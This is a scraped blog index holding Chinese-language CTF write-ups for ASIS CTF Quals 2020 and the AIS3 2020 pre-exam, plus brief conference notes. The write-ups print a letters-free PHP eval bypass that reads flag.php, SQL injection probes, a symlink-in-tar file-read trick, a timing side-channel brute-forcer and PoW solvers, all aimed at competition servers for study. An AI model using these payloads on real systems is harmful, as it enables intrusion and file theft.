議程部分都大概平均 30 min，Day 1 主要都在逛攤、Day 2 由於很想聽網路安全的釣魚專題 還有 @stavhaygn 的專題，所以偷溜出去的頻率少了一些，印象中聽的議程有GCP、SDN x Cloud、Golang、Vault 私鑰管理，還有個Open Source 推廣分享是去朝聖常常在 FB 和小馬拌嘴的蝦蝦姊（笑）。我在開源界的時間不算長，平常也只是偶爾摳來用，所以跑的主題幾乎都是聽過但沒機會摸，算是去增廣見聞，另外、還有認親 XDDDD 噢對了，另外我還拿到了神奇序號，主要是右邊的.tw免費註冊域名，只是想 domain name 是個令人頭疼的事QQ 另外左邊的.GAY工商真的頗炫wwww 還一直被朋友鼓吹去買個，真是謝了 ","date":"2020-08-05","objectID":"/posts/2020/2020-summer-conf-p1/:0:2","tags":["AIS3","COSCUP"],"title":"[Sharing] 2020 Summer Conf. PART 1","uri":"/posts/2020/2020-summer-conf-p1/"},{"categories":["資訊安全 Cyber Security"],"content":" 暑假第一場 CTF online，同時也是我們 MacacaHub 的今年第三戰~ 不過同時也被隊長告知有一定的難度要有心理準備，嗯、真滴難QwQ 題組全部共 31 題，雖然只解 4 題還有 Rank 151 / 815 … 太可怕了== CTFtime link ","date":"2020-07-14","objectID":"/posts/2020/asisctf-qual-2020/:0:0","tags":["ASIS CTF","心得分享"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/posts/2020/asisctf-qual-2020/"},{"categories":["資訊安全 Cyber Security"],"content":"寫在前面的話 從上圖可以看得出來，我們解出來的四題扣掉 Welcome 和 Survey(feedback)，實際答出來的只有兩題。然而還是有兩支隊伍破台，別忘了這場還是Quals(資格賽)，人外有人天外有天呢… 既然只摸出兩題，這篇標題自然沒辦法放 “writeup\"，所以就當做見見世面發些心得，同時針對一些賽中我認為很有趣的題目稍微參考別人解法寫一下，其實有幾題看完題解發現都不太難，只是有沒有發現而已QQ。 ","date":"2020-07-14","objectID":"/posts/2020/asisctf-qual-2020/:1:0","tags":["ASIS CTF","心得分享"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/posts/2020/asisctf-qual-2020/"},{"categories":["資訊安全 Cyber Security"],"content":"Mechanism: Proof of Work 上次遇到 PoW 是 AIS3 EOF CTF 2019 的 Ponzi Scheme，這技術常見於區塊鏈加密貨幣的機制，是一種對應服務與資源濫用、或是阻斷服務攻擊(DoS)的經濟對策。要求使用者進行一些耗時適當的複雜運算，並且答案能被服務方快速驗算，以此耗用的時間、裝置與能源做為擔保成本，以確保服務與資源是被真正的需求所使用。 所以某方面也算是官方針對 nc 題目一種自我保護的機制，避免被大量玩家戳一戳就掛掉。另一方面，我自己猜可能有些題目可以用 Brute Force 的爆出答案，避免這種情況才加了這項機制。總之，雖然並非主要考點，但如果過不了也沒辦法解題XD 雖然並不是每題 nc 題目都有 PoW ，不過翻了翻 ASIS CTF 往年的題目只要有出現 PoW 的都不太一樣，沒辦法直接抄來用QQ ￬￬￬ 以這場來看，PoW描述如下 ￬￬￬ $ nc [ip] [port] \u003e Please submit a printable string X, such that sha224(X)[-6:] = 6be655 and len(X) = 19 haha \u003e You must pass this PoW challenge :P 翻譯一下：系統要求輸入長度為 19 的字串 X，同時要滿足 sha224(X) 後 6 位為 6be655。 其中， Hash Algorithm 的部分每次連線結果都不同，隨意測試就有 sha1, sha224, sha256, sha384, sha512, md5 …ect ，而且不同往年 ASIS CTF 多了指定 輸入長度len(x) ，同樣每次連線結果不同，測出來 Range 大約 10 - 40。 根據 Hash 的特性，雖然因為不可逆沒辦法從後6位往回推，但相同的輸入一定會得到 相同的輸出 ，那我們其實可以暴力產生指定長度的輸入，拿去 hash 再看看有沒有符合後6位的條件就行了。 個人的做法是連線後用字串處理拿到 Hash Algorithm 和 length ，只針對 sha256 且長度為 10的PoW直接爆搜字串進行驗證，簡單用python表示如下: from pwn import * import hashlib import string def pow_solve(s): for a in string.printable: for b in string.printable: for c in string.printable: for d in string.printable: for e in string.printable: for f in string.printable: for g in string.printable: for h in string.printable: for i in string.printable: for j in string.printable: if hashlib.sha256(a+b+c+d+e+f+g+h+i+j).hexdigest()[-6:] == s: return a+b+c+d+e+f+g+h+i+j # 通常1000次內一定會有 sha256 \u0026 len=10 for i in range(1000): r = remote(host, port) # 省略字串處理過程 hash_algo = r.recv(6) if s == 'sha256': target = r.recv(6) length = r.recv(2) if int(length) == 10: r.sendline(pow_solve(target)) r.interactive() #solve() r.close() 我知道一定會有人想吐槽那個 10 層迴圈，不過不想花時間刻 DFS 這樣寫最直觀 XD 賽後在網路上翻到其他玩家的作法如下，趕緊存起來!! source link #!/usr/bin/python3 import hashlib import uuid from pwn import * #import string r = remote(\"76.74.178.201\", 8002) info = r.recvuntil(\"\\n\").decode(\"UTF-8\").split(\" \") print(info) algo = info[8].split(\"(\")[0] target = info[10] length = int(info[-1]) print(f\"[*] algo needed: {algo}\") print(f\"[*] target needed: {target}\") print(f\"[*] length needed: {length}\") def random_ascii_generator(l): string = str(uuid.uuid4()).replace(\"-\", \"\")[0:l].encode(\"ascii\") return string[0:l] algo_matching = { \"sha1\": hashlib.sha1, \"md5\": hashlib.md5, \"sha224\": hashlib.sha224, \"sha256\": hashlib.sha256, \"sha384\": hashlib.sha384, \"sha512\": hashlib.sha512, } candidate_hash = \"\" while not candidate_hash[-6:] == target: candidate_string = random_ascii_generator(length) candidate_hash = algo_matching[algo](candidate_string).hexdigest() print(\"[*] PoW found\") r.sendline(candidate_string) print(r.recvline()) print(r.recvline()) print(r.recvline()) print(r.recvline()) print(r.recvline()) print(r.recvline()) 執行看起來就簡潔有力，好羨慕 \u003e///\u003c P.S. 圖中的題目為 PPC-Titanic。 ","date":"2020-07-14","objectID":"/posts/2020/asisctf-qual-2020/:2:0","tags":["ASIS CTF","心得分享"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/posts/2020/asisctf-qual-2020/"},{"categories":["資訊安全 Cyber Security"],"content":"[Web] Web Warm-up (Solved) Warm up! Can you break all the tasks? I’ll pray for you! read flag.php Link: http://69.90.132.196:5003/?view-source \u003c?php if(isset($_GET['view-source'])){ highlight_file(__FILE__); die(); } if(isset($_GET['warmup'])){ if(!preg_match('/[A-Za-z]/is',$_GET['warmup']) \u0026\u0026 strlen($_GET['warmup']) \u003c= 60) { eval($_GET['warmup']); }else{ die(\"Try harder!\"); } }else{ die(\"No param given\"); } 從上方 source code 可以用 GET /warmup=，想辦法存取flag.php，不過限制就是無法使用英文字母以及payload長度必須小於60字元。 重點在於preg_match繞過，關鍵字拿去查找到 [ctf中 preg_match 绕过技术 | 无字母数字的webshell] (https://www.cnblogs.com/v01cano/p/11736722.html)。 其中的解法1就是答案了，簡單講就是利用\"特殊字元\"互相 XOR 出\"字母”，舉例來說: \u003e\u003e\u003e chr(ord('m')^ord('@')) '-' 表示 @ ^ - = m，最後只差在該如何構造出payload，畢竟我對php沒有到很熟 QQ 在參考其他ctf writeup想到的解法是 $_=']),\u003e'^';@@['; // file $__='\\],::'^'{;@[]'; // 'flag $___='-@-\\\\'^'](]{'; // php' $_($__.$___); // file('flag.php') payload: $_=']),\u003e'^';@@[';$__='\\],::'^'{;@[]';$___='-@-\\\\'^'](]{';$_($__.$___); 無奈長度達69沒辦法繞過第二項條件。 另外用 $_='-@-)@]@'^'](]@.;/';$_(); 拼出 phpinfo();後可以觀察到有趣的資訊… 好吧好像一點也不有趣，對方伺服器擋了很多方便的系統函數，所以 @stavhaygn 也戳了不少 payload 都落空。 最後拼出來的答案其實很簡單… 就是 readfile('flag.php'); 長度方面 ('[\u003e:@]),\u003e'^')[[$;@@[')('],::.-@-'^';@[]%00](]'); 為 49 ，可喜可賀。 ","date":"2020-07-14","objectID":"/posts/2020/asisctf-qual-2020/:3:0","tags":["ASIS CTF","心得分享"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/posts/2020/asisctf-qual-2020/"},{"categories":["資訊安全 Cyber Security"],"content":"[Web] Treasury #1 (Unsolved) 從題目點開連結後畫面如下，其中 AE 點開會跳出小視窗顯示書本內容，而 RO 會開新視窗連到書本來源。 我們從 treasury.js 可以看到抓取書本內容的方式為 /books.php?type=excerpt\u0026id=xx ，其中 xx 就對應畫面中出現的三本書 id 分別為 1, 2, 3。 然後、就沒有然後了。 原因是我們顧著用整數戳 id ，或是想辦法找其他入口，忽略字串形式的方法（事實上我也沒戳很久就是了）。賽後看完 Writeup ，感覺自己缺少了很多這方面的瞭解，就算找到 SQLi 可能還是沒辦法戳出來QwQ 以下我大概整理 writeup 的解題思路： a. 確定SQLi漏洞 透過 id=1' and 1=1; --%20 、 id=1' and 1=2; --%20 ，前者成功回傳資料，後者沒有任何顯示，可知該command後面的statement成功被執行。 P.S. 要注意 -- 註解後要多個空白 %20 ，否則會執行失敗 b. 嘗試用UNION搭配其他SQL command 從 id=9' union select 'hello'; --%20 發現回傳的Warning資訊是關於 simplexml_load_string() ，同時也間接表示可能有XXE的漏洞。 c. 確認資料庫種類和版本 從 id=9' union select @@version; --%20 瞭解資料庫為 MariaDB 及版本 10.5.4 ，然後 writeup 提供 https://sqliteonline.com/ 可以線上測試資料庫指令。 d. 逐步猜資料庫欄位 之後有點像 sqlmap 從已知的資訊開始把資料庫的內容還原出來，搜尋\"mariadb enumerate columns\"。 select column_name from information_schema.COLUMNS where table_name='books' limit 1,1; --: 其中information_schema.COLUMNS為一個View Table物件，另外limit可以限制開始位置(zero based)及列出筆數。 e. 針對XML structure逐步還原資料 writeup 中是利用substr(str, pos, len)嘗試抓 XML 資料，從錯誤提示把 tag 慢慢拼湊起來，如下。 \u003cbook\u003e \u003cid\u003e1\u003c/id\u003e \u003cname\u003eblah\u003c/name\u003e \u003cauthor\u003eblah\u003c/author\u003e \u003cyear\u003eblah\u003c/year\u003e \u003clink\u003eblah\u003c/link\u003e \u003cflag\u003eblah\u003c/flag\u003e \u003cexcerpt\u003eblah\u003c/excerpt\u003e \u003c/book\u003e concat('\u003cbook\u003e\u003cexcerpt\u003e',replace(info, '\u003c', ''),'\u003c/excerpt\u003e\u003c/book\u003e') 最後為了讓所有資訊都能完整顯示(包含tag)，writeup使用cancat連結所有字串 及 replace('\u003c','')把左角括號拿掉使tag渲染失敗，結束。 至於 Treasury #2 就是接下去利用 XXE 撈 flag。 ","date":"2020-07-14","objectID":"/posts/2020/asisctf-qual-2020/:4:0","tags":["ASIS CTF","心得分享"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/posts/2020/asisctf-qual-2020/"},{"categories":["資訊安全 Cyber Security"],"content":"[Crypto] Baby RSA (Unsolved) All babies love [RSA] (↓). How about you? #!/usr/bin/python from Crypto.Util.number import * import random from flag import flag nbit = 512 while True: p = getPrime(nbit) q = getPrime(nbit) e, n = 65537, p*q phi = (p-1)*(q-1) d = inverse(e, phi) r = random.randint(12, 19) if (d-1) % (1 \u003c\u003c r) == 0: break s, t = random.randint(1, min(p, q)), random.randint(1, min(p, q)) t_p = pow(s*p + 1, (d-1)/(1 \u003c\u003c r), n) t_q = pow(t*q + 4, (d-1)/(1 \u003c\u003c r), n) print 'n =', n print 't_p =', t_p print 't_q =', t_q print 'enc =', pow(bytes_to_long(flag), e, n) n = 10594734342063566757448883321293669290587889620265586736339477212834603215495912433611144868846006156969270740855007264519632640641698642134252272607634933572167074297087706060885814882562940246513589425206930711731882822983635474686630558630207534121750609979878270286275038737837128131581881266426871686835017263726047271960106044197708707310947840827099436585066447299264829120559315794262731576114771746189786467883424574016648249716997628251427198814515283524719060137118861718653529700994985114658591731819116128152893001811343820147174516271545881541496467750752863683867477159692651266291345654483269128390649 t_p = 4519048305944870673996667250268978888991017018344606790335970757895844518537213438462551754870798014432500599516098452334333141083371363892434537397146761661356351987492551545141544282333284496356154689853566589087098714992334239545021777497521910627396112225599188792518283722610007089616240235553136331948312118820778466109157166814076918897321333302212037091468294236737664634236652872694643742513694231865411343972158511561161110552791654692064067926570244885476257516034078495033460959374008589773105321047878659565315394819180209475120634087455397672140885519817817257776910144945634993354823069305663576529148 t_q = 4223555135826151977468024279774194480800715262404098289320039500346723919877497179817129350823600662852132753483649104908356177392498638581546631861434234853762982271617144142856310134474982641587194459504721444158968027785611189945247212188754878851655525470022211101581388965272172510931958506487803857506055606348311364630088719304677522811373637015860200879231944374131649311811899458517619132770984593620802230131001429508873143491237281184088018483168411150471501405713386021109286000921074215502701541654045498583231623256365217713761284163181132635382837375055449383413664576886036963978338681516186909796419 enc = 5548605244436176056181226780712792626658031554693210613227037883659685322461405771085980865371756818537836556724405699867834352918413810459894692455739712787293493925926704951363016528075548052788176859617001319579989667391737106534619373230550539705242471496840327096240228287029720859133747702679648464160040864448646353875953946451194177148020357408296263967558099653116183721335233575474288724063742809047676165474538954797346185329962114447585306058828989433687341976816521575673147671067412234404782485540629504019524293885245673723057009189296634321892220944915880530683285446919795527111871615036653620565630 題目給了一份 code 和 output.txt，要求把 flag 推出來。 看起來還算是個資訊很多的crypto題，所以我一開始完全忽略 line 18 - 20，只想著能不能從 output.txt 把 flag 拼出來。後來也發現 n 根本沒辦法透過 factordb.com 拆成p, q，某方面來說也是蠻現實的題目：給予密文enc、公鑰(e, n)，不過多了奇怪的線索t_p, t_q。 參考 writeup 前半部 While 是標準的 RSA ，從 writeup 來看關鍵就在 line 18 - 20… 嗯、聽起來是廢話，但我當初忽略的原因在於 line 18 的 s, t 完全是透過 p, q 隨機出來的數字，就算知道 n 可以間接固定 p , q ，但在爆不出來的情況下更遑論推出 d，所以花了很多時間在亂推式子 == 真正的關鍵點在line 19: t_p = pow(s*p + 1, (d-1)/(1 \u003c\u003c r), n)，在已經知道 $t_p$ 的前提可以整理如下: $$t_p = (s*p + 1) ^ {(d-1)/(1«r)}$$ 再來writeup說明算式右邊部分除了 $1$ 以外都可以被 $p$ 整除，我自己最後的理解如下。 令 $x = s * p$ ，在 $(x + 1) ^ k$ 的情況下把 $k$ 用 $2, 3$ 代入看看： $$(x+1)^2 = x^2 + 2*x*1 + 1^2$$ $$(x+1)^3 = x^3 + 3*x^2*1^1 + 3*x^1*1^2 + 1^3$$ 根據上述兩式，若 $x$ 能夠被 $p$ 整除，那會得到 $(x+1)^k = 1\\ mod\\ p $，回到原式可知 $$t_p\\ mod\\ p = (s*p + 1) ^ {(d-1)/(1«r)}\\ mod\\ p = 1 ， \\therefore t_p = 1\\ mod\\ p$$ 這下我們可以確定 $t_p-1$ 是 $p$ 的倍數，同時由於 $n=p*q$ ， $n$ 也是 $p$ 的倍數，剩下就好辦了~ ↓ 直接照搬code（懶） ↓ \u003e\u003e\u003e from Crypto.Util.number import * \u003e","date":"2020-07-14","objectID":"/posts/2020/asisctf-qual-2020/:5:0","tags":["ASIS CTF","心得分享"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/posts/2020/asisctf-qual-2020/"},{"categories":["資訊安全 Cyber Security"],"content":"[Misc][Forensics] Adventure Time plays a role in almost every decision. And some decisions define your attitude about time. Can you [README.txt]? It’s time for a new adventure! Note: Slow-download is international and part of the task. 題目給定下載連結，印象中好像有到 4G bytes，然後你會發現下載超慢還會斷XDD 然後我就傻傻的一直給他按下載丟著讓他跑，想當然爾沒有結果~ 看完 writeup 才發覺這題其實還蠻好玩der !! 如果有時間希望可以在這裡補完自己摸過之後的想法 \u003e\u003c ","date":"2020-07-14","objectID":"/posts/2020/asisctf-qual-2020/:6:0","tags":["ASIS CTF","心得分享"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/posts/2020/asisctf-qual-2020/"},{"categories":["資訊安全 Cyber Security"],"content":" 第一次參加為期三天 AIS3 pre-exam，好興奮 \u003e \u003c 不過我這歲數來說好像有點晚了，看到好多高中生參賽不禁回憶自己高中到底在幹嘛www 平常在 CTFTime 的線上賽已經習慣找 @stavhaygn 開示，這次個人賽只能靠自己了 QwQ ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:0:0","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Foreword 先放上人權圖(Rank 113/427)，雖然成績不怎麼樣www 這份 writeup 基本上把 300 分以下的補完了，如果有其他建議還請不吝指教。 （各題原始分數為 500 分，根據官方的計分規則，題目到 180 人解就會降到最底 100 分。） ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:1:0","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"官方 Writeups Misc Reverse Pwn Crypto Web ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:1:1","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Misc ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:2:0","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"💤 Piquero (100 points, 347 solves) Description Solution 利用線上工具 Braille Decoder 即可，要注意的是點字的大寫規則(.a = A)，包含我在內很多人的錯誤率都從這邊來的XD 若想瞭解一下細節不妨可以參考 啾啾鞋 - ⠓⠥⠈⠨⠐⠙⠌⠂⠙⠯⠈⠙⠞⠈⠓⠱⠐⠕。 ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:2:1","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"🐥 Karuego (100 points, 245 solves) Description 題目給了一張Karuego圖（捏他「入間同學入魔了！」），想玩的請自取 HERE。 Solution 直覺就是圖片隱寫術 (Steganography)，通常都會先用 binwalk 看看有沒有藏檔案，不過這裡我直接拿去丟 stegsolve 神器，從LSB不小心挖到奇怪的key，這才回頭用 foremost 找藏在圖片中的壓縮檔XD。 Solution 2 賽後和 @stavhaygn 聊才知道用 binwalk 找到壓縮檔後可以用 KPA(known plaintext attack) 工具 PKcrack 去爆密碼，在官方的 Discord 群組也有看到同樣說法，看來也是預期解之一。 ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:2:2","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"🌱 Soy (139 points, 172 solves) Description Solution 利用線上工具 qrazybox 將 QRcode 還原。從 QRcode 長寬可知 ver.2，至於 format info 可以透過 Error Correction Level 和 Mask Pattern 的找到和題目相同的組合，剩下就格子點一點就有 Flag 了。 ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:2:3","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"👑 Saburo (359 points, 108 solves) Description 題目需要 nc 到官方 Server，透過輸入字串後會得到 “Haha, you lose in xx milliseconds.” ，其中的 xx 是隨機變動的數字（同樣輸入字串\"a\"，回傳的數字範圍會在 11-15 浮動），透過測試會發現輸入越接近 flag 數字會越大，直到猜到 flag 為止。 PS. flag is printable characters with AIS3{…} Solution 對於要用來測試的 table ，考慮到 flag 除了英文字母及數字，可能還會有 {, }, _ 之類的，可以利用 python string library 。 之後逐步猜字，用統計的方式把 table 每個字元都測 10 遍找回傳 ms 最大的，如果最後抓不到回傳的數字代表戳到 flag 了XD。 另外還有一點，由於過程中需要不斷 nc 官方 Server，因此需要特別用 conn.close() 關閉連線，不然跑久了會報錯，個人在這邊吃鱉一陣子…可見寫程式的習慣還是很重要的。 from pwn import * from string import * table = list(ascii_letters+digits+punctuation) #flag = \"AIS3{A1r1ght_U_4r3_my_3n3nnies}\" flag = \"AIS3{\" while True: max_val = 0 target = '' for ch in table: payload = flag + ch max_local = 0 for j in range(10): conn = remote(\"60.250.197.227\", 11001) conn.recvuntil('Flag:') conn.sendline(payload) try: res = int(conn.recvline().split()[-2]) conn.close() except: print(flag + ch) conn.close() sys.exit(0) max_local = max(max_local, res) if max_local \u003e max_val: target = ch max_val = max_local flag = flag + target print(flag) ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:2:4","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"👿 Shichirou (Post-solved, 450 points, 65 solves) Description 同樣是需要 nc 到官方 Server ，透過瞭解 source code 想辦法取得 flag。 #!/usr/bin/env python3 import os import sys import tempfile import subprocess import resource resource.setrlimit(resource.RLIMIT_FSIZE, (65536, 65536)) os.chdir(os.environ['HOME']) size = int(sys.stdin.readline().rstrip('\\r\\n')) if size \u003e 65536: print('File is too large.') quit() data = sys.stdin.read(size) with tempfile.NamedTemporaryFile(mode='w+', suffix='.tar', delete=True, dir='.') as tarf: with tempfile.TemporaryDirectory(dir='.') as outdir: tarf.write(data) tarf.flush() try: subprocess.check_output(['/bin/tar', '-xf', tarf.name, '-C', outdir]) except: print('Broken tar file.') raise try: a = subprocess.check_output(['/usr/bin/sha1sum', 'flag.txt']) b = subprocess.check_output(['/usr/bin/sha1sum', os.path.join(outdir, 'guess.txt')]) a = a.split(b' ')[0] b = b.split(b' ')[0] assert len(a) == 40 and len(b) == 40 if a != b: raise Exception('sha1') except: print('Different.') raise print(open('flag.txt', 'r').readline()) Solution 賽後聽 @stavhaygn 說這題對 MacacaHub 算考古題… 來自去年金盾獎決賽== 不過從遊記108金盾獎決賽看得出來我沒有參與到解題過程，可惡QwQ 簡單解釋一下上方的code: line 12 基本上就是輸入數字，即檔案大小。 line 17, 18 輸入 tar 包裝檔案（可以利用 pwntool），然後在line 23進行解包。 line 29 - 35 針對官方Server的兩個檔案 guess.txt 和 flag.txt 進行 SHA-1 比對，若相同就吐出 flag。 我起初乍看之下還以為是 SHA-1 bypass ，但我們並不能改變 Server 的檔案，那我們到底是要上傳啥哩？ 關鍵就是 Symbolic link，有點像是建立捷徑的概念，把 guess.txt 和 flag.txt 連結在一起。 首先，在本地端用指令建立連結，透過ls查看。 $ ln -s flag.txt guess.txt $ ls -al lrwxrwxrwx ... guess.txt -\u003e flag.txt 再來就是進行tar打包（無壓縮）。 $ tar cvf guess.tar guess.txt 如此我們就能得到一個 tar 檔案，再來把扣摳一摳就行了吧。 from pwn import * conn = remote('60.250.197.227', 11000) with open('./guess.tar', 'rb') as f: tar = f.read() num = len(tar) conn.sendline(str(num)) conn.sendline(tar) conn.interactive() BOOOOOOOM，RUN起來結果看起來是爛掉了。 從第四行看得出來 guess.txt 和 flag.txt 似乎不在同一個目錄中。 不過錯誤提示也把路徑告訴我們了，簡單講大guy長得像底下這樣。 /home/ctf/ ├── flag.txt ├── tmp7lzztdlk │ ├── guess.txt 那就把連結的部分刪掉重來一遍！ $ rm guess.txt guess.tar # 記得把舊檔砍掉 $ ln -s /home/ctf/flag.txt guess.txt $ ls -al lrwxrwxrwx ... guess.txt -\u003e /home/ctf/flag.txt $ tar cvf guess.tar guess.txt 重跑 python code 就能拿 flag 了~ ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:2:5","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Reverse ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:3:0","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"🍍 TsaiBro (100 points, 281 solves) Description 題目給了一份ELF檔 TsaiBro 和一份密語(?) TsaiSaid。 Solution 題目幾乎同去年 AIS3 pre-exam ，似乎是出題者被上層指示每項分類要有一題和往年方向相同，差別在 ELF 檔內的 table 不同。 如果直接執行 ELF 檔，可以發現輸出除了第一句之外，之後的\"發財…“會隨著輸入的字串而改變（如下），因此我們的目標就是要把題目另外附的密語還原成FLAG。 $ chmod +x ./TsaiBro # 給檔案可執行的權限 $ ./TsaiBro ha Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸... 發財......發財....發財...發財 $ ./TsaiBro haha Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸... 發財......發財....發財...發財.發財......發財....發財...發財. $ ./TsaiBro hahaha Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸... 發財......發財....發財...發財.發財......發財....發財...發財.發財......發財....發財...發財 針對 TsaiBro，我們打開 IDA Pro (好朋友版)使用 F5 大法，可以發現程式內主要轉換的方式如下: table = \"56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234\"; for ( i = 0; i \u003c strlen(argv[1]); ++i ) { for ( j = 0; j \u003c= 63; ++j ) { if ( table[j] == argv[1][i] ){ printf(\u0026byte_968, (unsigned int)(j / 8 + 1), \"..........\", (unsigned int)(j % 8 + 1), \"...........\"); break; } } } 針對輸入 argv[1] 的每個字元，程式會先查表(table)，然後分別算出 j / 8 + 1 個點 和 j % 8 + 1 個點。 由此可知道我們可以反過來把密語中的”…“兩兩一組回推 j 再回頭查表就能把 FLAG 推出來了！ #include \u003cbits/stdc++.h\u003e using namespace std; int main(){ string s; fstream file; file.open(\"TsaiBroSaid\", ios::in); getline(file, s); file \u003e\u003e s; // 把第一段\"Terry...逆逆...\" 吃掉🤪 s = regex_replace(s, regex(\"發財\"), \" \"); // 把\"發財\"用\"空白\"取代 stringstream ss(s); vector\u003cint\u003e v; // 以空白作為切割點把\"...\"的數量存起來 while( getline(ss, s, ' ') ){ if(s.length()) v.push_back(s.length()); } string table = \"56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234\"; for(int i=0; i\u003cv.size(); i+=2){ int idx = v[i+1] + (v[i]-1) * 8 - 1; cout \u003c\u003c table[idx]; } return 0; } ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:3:1","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"🎹 Fallen Beat (144 points, 171 solves) Description 題目給了一份用JAVA寫的音樂遊戲 Fallen Beat，必須要達到 FC(Full Combo, 全音符皆有按到)才會給 flag，事後聽說似乎是出自中大計概的期末project，好猛XDDD 遊戲方式如下 Solution 如果遊戲方式只有單純 D, F, J, K 四鍵或許我還會拼拼看，不過加上 space 其實還蠻干擾的(抹臉)。既然這題分類都在 Reverse，本來就不是給人直接玩出 FLAG… 如果有誰錄手元我還是蠻期待的wwww 回歸正題，既然要逆 .jar，當然就找 JAVA Decompiler ，這裡我用 JD-GUI，然後把 .jar 扔進去觀察一下，雖然說 class 不多到處亂翻也會有線索，不過既然是 FC 結束才出現 flag，自然可以往 PanelEnding.class 的方向挖，嗯、就是有個 flag 放在那裡（笑） 利用關鍵字循線往下看… 果然還是會經過一些計算，不會這麼容易直接把FLAG給出來QQ 仔細看一下可以發現我們還少了很重要的變數 cache 資訊。 這裡其實我卡了一小段時間，因為回追總是會在某個環節就追丟，可能也是自己對 JAVA 不太熟的緣故。 最後找到了一個文字檔 hell.txt ，看起來蠻像是遊戲用的譜面(?) 而關於這個 hell.txt 是個 1475 行的純數字檔，節錄開頭如下。 186 ***** DATA 1 0 0 0 28 0 0 14 0 ... ... 搭配前面所找到的 flag 的計算，該有的線索都有就能直接回推結果了。 #include \u003cbits/stdc++.h\u003e using namespace std; int main(){ string s; fstream file; file.open(\"./songs/gekkou/hell.txt\", ios::in); getline(file, s); getline(file, s); // 把前兩段吃掉 vector\u003cint\u003e cache; while( getline(file, s) ){ stringstream ss(s); int num; ss \u003e\u003e num; cache.push_back(num); } int flag[] = {89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 109, 97, 73,110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 71, 114, 125, 68, 105, 127, 124, 94, 103, 46, 107, 97, 104 }; int flag_len = sizeof(flag)/sizeof(flag[0]); for(int i=0; i\u003ccache.size(); i++){ flag[ i % flag_len ] ^= cache[i]; } for(int i=0; i\u003cflag_len; i++){ cout \u003c\u003c (char)flag[i]; } return 0; } Solution 2 和 Lab 朋友聊過才知道原來還有其他解法，就是直接用 patch 的方式改成無視 FC，不過似乎還會被排版搞(?) 要再手動調位置。賽後官方 Discord 群組對話出現下面這張，如果真的有人手動 FC 看到這排版應該會哭出來吧XDDDDD ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:3:2","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"🧠 Stand up!Brain (455 points, 62 solves) Description 這題給了一份ELF檔 joke，並且在引言中表示「這次輪到你說個笑話來聽聽了」。 Solution 其實原本想照 IDA Pro 的規則先手動推推看，沒想到就把「笑話」推出來了 ㄏ ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:3:3","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber 